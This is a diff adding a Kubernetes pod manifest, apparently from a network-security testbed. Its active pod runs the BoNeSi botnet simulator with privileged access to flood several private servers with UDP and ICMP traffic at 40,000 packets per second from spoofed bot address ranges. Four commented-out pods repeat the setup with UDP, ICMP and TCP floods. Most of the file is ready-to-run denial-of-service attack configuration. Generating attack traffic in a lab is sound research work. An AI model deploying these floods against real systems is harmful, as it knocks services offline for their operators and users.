@@ -1,0 +1,244 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  labels:
+    role: ddos1
+  name: ddos1
+  annotations:
+    cni.projectcalico.org/ipAddrs: "[\"10.128.200.26\"]"
+    cni.projectcalico.org/allowedSourcePrefixes: "[\"10.128.4.1/24\", \"10.129.4.1/24\", \"200.128.4.1/24\", \"10.130.0.1/16\"]"
+ 
+spec:
+  restartPolicy: Never
+  volumes:
+  - name: vol
+    hostPath:
+      path: /vol
+  containers:
+  - name: ddos1
+    volumeMounts:
+      - name: vol
+        mountPath: /app/data  # in the container filesystem
+    image: bonesi:wp3.v2
+    tty: True
+    command: 
+      - "/bin/bash"
+      - "-ce"
+      - |
+          configure_nf_conntrack() {
+            echo "Configurando nf_conntrack"
+            sysctl -w net.netfilter.nf_conntrack_max=1503232
+            sysctl -w net.netfilter.nf_conntrack_buckets=375808
+            cat /proc/sys/net/netfilter/nf_conntrack_max
+          }
+
+          attack_server() {
+            local protocol=$1
+            local server_ip=$2
+            local attack_duration=$3
+            echo "Attacking Server $server_ip using $protocol"
+            bonesi -i /BoNeSi/bots -p "${protocol}" "${server_ip}" -t 2000 -r 40000 > /dev/stdout 2>&1 &
+            PID=$!
+            echo "The attack will last for $attack_duration"
+            sleep $attack_duration
+            echo "PID da BONESI: $PID"
+            kill -2 $PID
+            sleep 30
+          }
+
+          main() {
+            configure_nf_conntrack
+            sleep 60
+          
+            # Ataques UDP
+            attack_server udp 10.128.10.30:50001 90
+            attack_server udp 10.128.20.30:50001 90
+            attack_server udp 10.128.30.30:50001 90
+            attack_server udp 10.128.40.30:50001 90
+            attack_server udp 10.128.50.30:50001 90
+          
+            # Ataques ICMP
+            attack_server icmp 10.128.20.30:50001 90
+            attack_server icmp 10.128.10.30:50001 90
+            attack_server icmp 10.128.30.30:50001 90
+            attack_server icmp 10.128.40.30:50001 90
+            attack_server icmp 10.128.50.30:50001 60
+          
+            echo "Processos concluídos. Mantendo script ativo."
+            tail -f /dev/null
+          }
+
+          main
+    securityContext:
+      privileged: true
+      capabilities:
+        add:
+        - NET_RAW
+    ports:
+      - containerPort: 80 
+  nodeSelector:
+    rede: '16'
+---
+#apiVersion: v1
+#kind: Pod
+#metadata:
+#  labels:
+#    role: ddos2
+#  name: ddos2
+#  annotations:
+#    cni.projectcalico.org/ipAddrs: "[\"10.128.40.27\"]"
+#    cni.projectcalico.org/allowedSourcePrefixes: "[\"10.128.5.1/24\", \"10.129.5.1/24\", \"200.128.5.1/24\", \"10.131.0.1/16\"]"
+# 
+#spec:
+#  restartPolicy: Never
+#  volumes:
+#  - name: vol
+#    hostPath:
+#      path: /vol
+#  containers:
+#  - name: ddos2
+#    volumeMounts:
+#      - name: vol
+#        mountPath: /app/data  # in the container filesystem
+#    image: bonesi:wp3.v1
+#    tty: True
+#    command: [ "/bin/bash", "-ce", "printf \"10.128.5.1/24\n10.129.5.1/24\n200.128.5.1/24\n10.131.0.1/16\" > /BoNeSi/bots  &&  \ 
+#                        sysctl -w net.netfilter.nf_conntrack_max=1503232 && \ 
+#                        sysctl -w net.netfilter.nf_conntrack_buckets=375808 && \
+#     			sleep 60 && \
+#     			(bonesi -i /BoNeSi/bots -p udp 10.128.10.30:50001 -t 1000 -r 40000 &) && sleep 120 && kill -2 $(pidof bonesi) && \
+#     			sleep 60 && \ 
+#     			(bonesi -i /BoNeSi/bots -p udp 10.128.20.30:50001 -t 1000 -r 40000 &) && sleep 120 && kill -2 $(pidof bonesi) && \
+#     			sleep 60 && \	
+#     			(bonesi -i /BoNeSi/bots -p udp 10.128.30.30:50001 -t 1000 -r 40000 &) && sleep 120 && kill -2 $(pidof bonesi) && \
+#     			sleep 60 && \
+#     			(bonesi -i /BoNeSi/bots -p icmp 10.128.20.30:50001 -t 1000 -r 40000 &) && sleep 180 && kill -2 $(pidof bonesi) && \
+#     			sleep 60 && \
+#     			(bonesi -i /BoNeSi/bots -p icmp 10.128.10.30:50001 -t 1000 -r 40000 &) && sleep 180 && kill -2 $(pidof bonesi) && \
+#     			sleep 60 && \
+#     			(bonesi -i /BoNeSi/bots -p icmp 10.128.30.30:50001 -t 1000 -r 40000 &) && sleep 120 && kill -2 $(pidof bonesi) && \
+#     			tail -f /dev/null"]
+#    securityContext:
+#      privileged: true
+#      capabilities:
+#        add:
+#        - NET_RAW
+#    ports:
+#      - containerPort: 80 
+#  nodeSelector:
+#    rede: '10'
+#---
+#apiVersion: v1
+#kind: Pod
+#metadata:
+#  labels:
+#    role: ddos3
+#  name: ddos3
+#  annotations:
+#    cni.projectcalico.org/ipAddrs: "[\"10.128.40.28\"]"
+#    cni.projectcalico.org/allowedSourcePrefixes: "[\"10.128.6.1/24\", \"10.129.6.1/24\", \"200.128.6.1/24\", \"10.132.0.1/16\"]"
+# 
+#spec:
+#  restartPolicy: Never
+#  volumes:
+#  - name: vol
+#    hostPath:
+#      path: /vol
+#  containers:
+#  - name: ddos3
+#    volumeMounts:
+#      - name: vol
+#        mountPath: /app/data  # in the container filesystem
+#    image: bonesi:wp3.v1
+#    tty: True
+#    command: [ "/bin/bash", "-ce", "printf \"10.128.6.1/24\n10.129.6.1/24\n200.128.6.1/24\n10.132.0.1/16\" > /BoNeSi/bots && \
+#                        sysctl -w net.netfilter.nf_conntrack_max=1503232 && \ 
+#                        sysctl -w net.netfilter.nf_conntrack_buckets=375808 && \
+#     			sleep 60 && \
+#     			(bonesi -i /BoNeSi/bots -p udp 10.128.10.30:50001 -t 1000 -r 40000 &) && sleep 120 && kill -2 $(pidof bonesi) && \
+#     			sleep 60 && \ 
+#     			(bonesi -i /BoNeSi/bots -p udp 10.128.20.30:50001 -t 1000 -r 40000 &) && sleep 120 && kill -2 $(pidof bonesi) && \
+#     			sleep 60 && \	
+#     			(bonesi -i /BoNeSi/bots -p udp 10.128.30.30:50001 -t 1000 -r 40000 &) && sleep 120 && kill -2 $(pidof bonesi) && \
+#     			sleep 60 && \
+#     			(bonesi -i /BoNeSi/bots -p icmp 10.128.20.30:50001 -t 1000 -r 40000 &) && sleep 180 && kill -2 $(pidof bonesi) && \
+#     			sleep 60 && \
+#     			(bonesi -i /BoNeSi/bots -p icmp 10.128.10.30:50001 -t 1000 -r 40000 &) && sleep 180 && kill -2 $(pidof bonesi) && \
+#     			sleep 60 && \
+#     			(bonesi -i /BoNeSi/bots -p icmp 10.128.30.30:50001 -t 1000 -r 40000 &) && sleep 120 && kill -2 $(pidof bonesi) && \
+#     			tail -f /dev/null"]
+#    securityContext:
+#      privileged: true
+#      capabilities:
+#        add:
+#        - NET_RAW
+#    ports:
+#      - containerPort: 80 
+#  nodeSelector:
+#    rede: '10'
+# ---
+# apiVersion: v1
+# kind: Pod
+# metadata:
+#   labels:
+#     role: ddos4
+#   name: ddos4
+#   annotations:
+#     cni.projectcalico.org/ipAddrs: "[\"10.128.40.29\"]"
+#     cni.projectcalico.org/allowedSourcePrefixes: "[\"10.128.7.1/24\", \"10.129.7.1/24\", \"200.128.7.1/24\", \"10.133.0.1/16\"]"
+ 
+# spec:
+#   volumes:
+#   - name: vol
+#     hostPath:
+#       path: /vol
+#   containers:
+#   - name: ddos4
+#     volumeMounts:
+#       - name: vol
+#         mountPath: /app/data  # in the container filesystem
+#     image: bonesi:wp3.v1
+#     tty: True
+#     command: [ "/bin/bash", "-ce", "printf \"10.128.7.1/24\n10.129.7.1/24\n200.128.7.1/24\n10.133.0.1/16\" > /BoNeSi/bots && sleep 180 && (bonesi -i /BoNeSi/bots -p tcp -d eth0 10.128.10.30:50001 -t 1000 -r 40000 &) && sleep 180 && kill -2 $(pidof bonesi) &&  tail -f /dev/null"]
+#     securityContext:
+#       privileged: true
+#       capabilities:
+#         add:
+#         - NET_RAW
+#     ports:
+#       - containerPort: 80 
+#   nodeSelector:
+#     rede: '10'
+# ---
+# apiVersion: v1
+# kind: Pod
+# metadata:
+#   labels:
+#     role: ddos5
+#   name: ddos5
+#   annotations:
+#     cni.projectcalico.org/ipAddrs: "[\"10.128.40.30\"]"
+#     cni.projectcalico.org/allowedSourcePrefixes: "[\"10.128.8.1/24\", \"10.129.8.1/24\", \"200.128.8.1/24\", \"10.134.0.1/16\"]"
+ 
+# spec:
+#   volumes:
+#   - name: vol
+#     hostPath:
+#       path: /vol
+#   containers:
+#   - name: ddos5
+#     volumeMounts:
+#       - name: vol
+#         mountPath: /app/data  # in the container filesystem
+#     image: bonesi:wp3.v1
+#     tty: True
+#     command: [ "/bin/bash", "-ce", "printf \"10.128.8.1/24\n10.129.8.1/24\n200.128.8.1/24\n10.134.0.1/16\" > /BoNeSi/bots  && sleep 180 && (bonesi -i /BoNeSi/bots -p tcp -d eth0 10.128.10.30:50001 -t 1000 -r 40000 &) && sleep 180 && kill -2 $(pidof bonesi) && tail -f /dev/null"]
+#     securityContext:
+#       privileged: true
+#       capabilities:
+#         add:
+#         - NET_RAW
+#     ports:
+#       - containerPort: 80 
+#   nodeSelector:
+#     rede: '10'
